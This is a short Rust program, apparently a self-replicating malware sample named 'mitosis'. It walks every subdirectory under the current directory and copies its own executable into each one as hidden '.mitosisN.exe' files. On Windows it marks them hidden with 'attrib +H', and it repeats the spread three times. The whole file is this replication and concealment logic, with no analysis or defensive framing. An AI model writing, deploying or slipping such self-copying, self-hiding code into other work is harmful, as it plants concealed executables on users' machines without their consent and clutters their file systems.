use std::env;
use std::fs;
use std::path::Path;
use std::io;
use walkdir::WalkDir;

fn mitosis(count: &mut u32, dir: &Path) -> io::Result<()> {
    let current = env::current_exe()?;

    for entry in WalkDir::new(dir)
        .into_iter()
        .filter_map(Result::ok)
        .filter(|e| e.file_type().is_dir())
    {
        let path = entry.path();

        let filename = format!(".mitosis{}.exe", *count);
        let copy_path = path.join(&filename);
        fs::copy(&current, &copy_path)?;
        set_hidden(&copy_path);

        *count += 1;
    }

    Ok(())
}

#[cfg(target_os = "windows")]
fn set_hidden(path: &Path) {
    use std::process::Command;
    let _ = Command::new("attrib")
        .args(&["+H", path.to_str().unwrap()])
        .output()
        .expect("Failed to set hidden attribute");
}


fn main() {
    let start_dir = env::current_dir().expect("Failed to get current directory");
    let mut count = 1;
    let mut iterations = 0;

    while iterations < 3 {
        if let Err(e) = mitosis(&mut count, &start_dir) {
            println!("Error replicating: {}", e);
        }
        iterations += 1;
    }
}
